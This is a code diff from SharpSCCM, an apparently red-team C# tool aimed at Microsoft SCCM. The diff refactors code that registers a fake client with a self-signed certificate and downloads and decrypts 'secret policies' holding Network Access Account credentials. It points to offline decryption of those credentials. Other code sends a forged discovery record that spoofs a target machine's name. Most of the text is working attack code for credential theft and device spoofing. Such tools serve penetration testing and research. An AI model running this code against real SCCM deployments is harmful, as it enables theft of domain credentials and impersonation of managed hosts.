@@ -40,7 +40,7 @@ namespace SharpSCCM
             X509Certificate2 certificate2 = certRequest.CreateSelfSigned(DateTimeOffset.Now, DateTimeOffset.Now.AddYears(1));
             certificate2.FriendlyName = $"{subjectName}";
             X509Certificate2 exportedCert = new X509Certificate2(certificate2.Export(X509ContentType.Pfx, string.Empty));
-            Console.WriteLine($"[+] Created \"{subjectName}\" in memory for device registration and signing/encrypting subsequent messages");
+            Console.WriteLine($"[+] Created \"{subjectName}\" certificate in memory for device registration and signing/encrypting subsequent messages");
             if (store)
             {
                 var x509Store = new X509Store("My", StoreLocation.CurrentUser);
@@ -52,6 +52,21 @@ namespace SharpSCCM
             return certificate;
         }
 
+        public static string DecryptPolicyBody(byte[] policyDownloadResponseBytes, MessageCertificateX509 certificate)
+        {
+            // Parse response ASN1 and decrypt contents
+            ContentInfo contentInfo = new ContentInfo(policyDownloadResponseBytes);
+            EnvelopedCms pkcs7EnvelopedCms = new EnvelopedCms(contentInfo);
+            pkcs7EnvelopedCms.Decode(policyDownloadResponseBytes);
+            RecipientInfo encryptedKey = pkcs7EnvelopedCms.RecipientInfos[0];
+            pkcs7EnvelopedCms.Decrypt(encryptedKey);
+            Console.WriteLine($"[+] Successfully decoded and decrypted secret policy");
+            // Delete the certificate from the current user store
+            DeleteUserCertificate(certificate);
+            string decryptedPolicyBody = Encoding.ASCII.GetString(pkcs7EnvelopedCms.ContentInfo.Content).Replace("\0", string.Empty);
+            return decryptedPolicyBody;
+        }
+
         public static void DeleteUserCertificate(MessageCertificateX509 certificate)
         {
             var x509Store = new X509Store("My", StoreLocation.CurrentUser);
@@ -60,7 +75,7 @@ namespace SharpSCCM
             Console.WriteLine($"[+] Deleted \"{certificate.X509Certificate.SubjectName}\" certificate from {x509Store.Name} store for {x509Store.Location}");
         }
         
-        public static MessageCertificateX509 GetEncryptionCertificate()
+        public static MessageCertificateX509 GetMachineEncryptionCertificate()
         {
             // Get encryption certificate used by the legitimate client
             MessageCertificateX509 certificate = MessageCertificateX509File.Find(StoreLocation.LocalMachine, "SMS", X509FindType.FindByApplicationPolicy, "1.3.6.1.4.1.311.101.2", false);
@@ -94,19 +109,7 @@ namespace SharpSCCM
                     HttpResponseMessage policyDownloadResponse = SendPolicyDownloadRequest(policyURL, clientId.ToString(), certificate);
                     byte[] policyDownloadResponseBytes = await policyDownloadResponse.Content.ReadAsByteArrayAsync();
                     Console.WriteLine($"[+] Received encoded response from server for policy {policyAssignment.Policy.Id}");
-
-
-
-                    // Parse response ASN1 and decrypt contents
-                    ContentInfo contentInfo = new ContentInfo(policyDownloadResponseBytes);
-                    EnvelopedCms pkcs7EnvelopedCms = new EnvelopedCms(contentInfo);
-                    pkcs7EnvelopedCms.Decode(policyDownloadResponseBytes);
-                    RecipientInfo encryptedKey = pkcs7EnvelopedCms.RecipientInfos[0];
-                    pkcs7EnvelopedCms.Decrypt(encryptedKey);
-                    Console.WriteLine($"[+] Successfully decoded and decrypted secret policy {policyAssignment.Policy.Id}");
-                    // Delete the certificate from the current user store
-                    DeleteUserCertificate(certificate);
-                    string decryptedPolicyBody = Encoding.ASCII.GetString(pkcs7EnvelopedCms.ContentInfo.Content).Replace("\0", string.Empty);
+                    string decryptedPolicyBody = DecryptPolicyBody(policyDownloadResponseBytes, certificate);
                     output += decryptedPolicyBody;
                     
                     if (decryptedPolicyBody.Contains("NetworkAccess"))
@@ -131,14 +134,17 @@ namespace SharpSCCM
                     */
                 }
             }
+
             if (!string.IsNullOrEmpty(outputPath))
             {
                 File.WriteAllText(outputPath, output);
                 Console.WriteLine($"[+] Wrote secret policies to {outputPath}");
             }
+            // Thanks to Evan McBroom for reversing and writing this decryption routine! https://gist.github.com/EvanMcBroom/525d84b86f99c7a4eeb4e3495cffcbf0
+            Console.WriteLine("[+] Done! Encrypted NAA hex strings can be decrypted offline using the \"DeobfuscateNAAString.exe <string>\" command");
         }
 
-        public static MessageCertificateX509 GetSigningCertificate()
+        public static MessageCertificateX509 GetMachineSigningCertificate()
         {
             // Get signing certificate used by the legitimate client
             MessageCertificateX509 certificate = MessageCertificateX509File.Find(StoreLocation.LocalMachine, "SMS", X509FindType.FindByApplicationPolicy, "1.3.6.1.4.1.311.101", false);
@@ -151,11 +157,8 @@ namespace SharpSCCM
             ConfigMgrRegistrationRequest registrationRequest = new ConfigMgrRegistrationRequest();
             // Add the certificate that will be tied to the new client ID for message signing and encryption
             registrationRequest.AddCertificateToMessage(certificate, CertificatePurposes.Signing | CertificatePurposes.Encryption);
-
-            // Discover local properties for client registration request
             Console.WriteLine("[+] Discovering local properties for client registration request");
             registrationRequest.Discover();
-
             // Modify properties
             Console.WriteLine("[+] Modifying client registration request properties:");
             registrationRequest.AgentIdentity = "CCMSetup.exe";
@@ -180,12 +183,10 @@ namespace SharpSCCM
                 }
             }
             Console.WriteLine($"      Site code: {registrationRequest.SiteCode}");
-
-            // Serialize message XML and display to user
+            // Serialize message XML
             registrationRequest.SerializeMessageBody();
             //Console.WriteLine($"\n[+] Registration Request Body:\n{System.Xml.Linq.XElement.Parse(registrationRequest.Body.ToString())}");
-
-            // Register client and wait for a confirmation with the SMSID
+            // Register client and wait for a confirmation with the SmsId
             Console.WriteLine($"[+] Sending HTTP registration request to {registrationRequest.Settings.HostName}:{registrationRequest.Settings.HttpPort}");
             SmsClientId clientId = registrationRequest.RegisterClient(sender, TimeSpan.FromMinutes(5));
             Console.WriteLine($"[+] Received unique GUID for new device: {clientId}");
@@ -194,25 +195,19 @@ namespace SharpSCCM
 
         public static void SendDDR(MessageCertificateX509 certificate, string target, string managementPoint, string siteCode, SmsClientId clientId)
         {
-            // HTTP sender is used for sending messages to the MP
             HttpSender sender = new HttpSender();
-
             // Build a gratuitous heartbeat DDR to send inventory information for the newly created system to SCCM
             ConfigMgrDataDiscoveryRecordMessage ddrMessage = new ConfigMgrDataDiscoveryRecordMessage();
-
             // Add our certificate for message signing and encryption
             ddrMessage.AddCertificateToMessage(certificate, CertificatePurposes.Signing);
             ddrMessage.AddCertificateToMessage(certificate, CertificatePurposes.Encryption);
-
-            // Discover local properties for DDR inventory report
             Console.WriteLine("[+] Discovering local properties for DDR inventory report");
-            ddrMessage.Discover(); // This is required to generate the inventory report XML
-
-            // Modify properties
+            // Generate inventory report XML
+            ddrMessage.Discover();
             Console.WriteLine("[+] Modifying DDR and inventory report properties");
             // Set the client GUID to the one registered for the new fake client
             ddrMessage.SmsId = new SmsClientId(clientId.ToString());
-            string originalSourceHost = ddrMessage.Settings.SourceHost.ToString();
+            string originalSourceHost = ddrMessage.Settings.SourceHost;
             // Set target to local machine if not provided in command line option
             if (string.IsNullOrEmpty(target))
             {
@@ -221,14 +216,12 @@ namespace SharpSCCM
             ddrMessage.Settings.SourceHost = target;
             ddrMessage.NetBiosName = target;
             ddrMessage.SiteCode = siteCode;
-            // This is required to build the DDR XML and inventory report XML but must take place after all modifications to the DDR message body
-            ddrMessage.SerializeMessageBody(); 
-
+            // Serialization is required to build the DDR XML and inventory report XML but must take place after all modifications to the DDR message body
+            ddrMessage.SerializeMessageBody();
             // Update inventory report header with new device information
             ddrMessage.InventoryReport.ReportHeader.Identification.Machine.ClientId = new InventoryClientIdBase(clientId);
             ddrMessage.InventoryReport.ReportHeader.Identification.Machine.ClientInstalled = false;
             ddrMessage.InventoryReport.ReportHeader.Identification.Machine.NetBiosName = target;
-
             // Modify DDR XML
             string ddrBodyXml = ddrMessage.Body.ToString();
             XmlDocument ddrXmlDoc = new XmlDocument();
@@ -240,7 +233,6 @@ namespace SharpSCCM
             ddrBodyXml = modifiedDdrXml.InnerXml;
             // Use reflection to modify read-only Body property
             typeof(MessageBody).GetProperty("Payload").SetValue(ddrMessage.Body, ddrBodyXml);
-
             // Modify inventory report XML
             string inventoryReportXml = ddrMessage.InventoryReport.ReportBody.RawXml;
             XmlDocument inventoryXmlDoc = new XmlDocument();
@@ -260,11 +252,9 @@ namespace SharpSCCM
             inventoryReportXml = inventoryReportXml.Replace(originalSourceHost, target);
             // Use reflection to modify read-only RawXml property
             typeof(InventoryReportBody).GetProperty("RawXml").SetValue(ddrMessage.InventoryReport.ReportBody, inventoryReportXml);
-
             // Display XML to user
             //Console.WriteLine($"\n[+] DDR Body:\n{System.Xml.Linq.XElement.Parse(ddrBodyXml)}");
             //Console.WriteLine($"\n[+] Inventory Report Body:\n{System.Xml.Linq.XElement.Parse("<root>" + ddrMessage.InventoryReport.ReportBody.RawXml + "</root>")}\n");
-
             // Assemble message and send
             ddrMessage.Settings.Compression = MessageCompression.Zlib;
             ddrMessage.Settings.ReplyCompression = MessageCompression.Zlib;
